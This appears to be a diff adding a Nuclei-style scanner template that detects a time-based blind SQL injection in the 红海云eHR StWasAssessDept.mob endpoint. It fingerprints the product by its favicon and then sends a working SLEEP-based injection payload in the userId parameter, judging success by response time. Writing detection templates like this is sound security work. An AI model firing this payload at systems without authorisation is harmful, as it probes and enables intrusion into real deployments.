@@ -1,0 +1,52 @@
+id: poc-yaml-hr-soft-stwasassessdept-mob-sqli
+info:
+  name: 红海云eHR StWasAssessDept.mob SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    description: |
+      This template detects SQL injection vulnerability in 红海云eHR StWasAssessDept.mob endpoint.
+      The issue is identified by analyzing the response time to a sleep-based payload.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /RedseaPlatform/ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "/RedseaPlatform/skins/images/favicon.ico"
+        part: body
+
+  - raw:
+      - |
+        GET /RedseaPlatform/submitStWasAssessDept/StWasAssessDept.mob?userId='+AND+(SELECT+3266+FROM+(SELECT(SLEEP({{t1}})))ShXk)+AND+'qmyT'='qmyT HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "修改失败"
+          - "\"isRecord\":"
+          - "\"jsonList\":"
+        part: body
+      - type: regex
+        regex:
+          - "^[^<]*$"
+        part: body
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
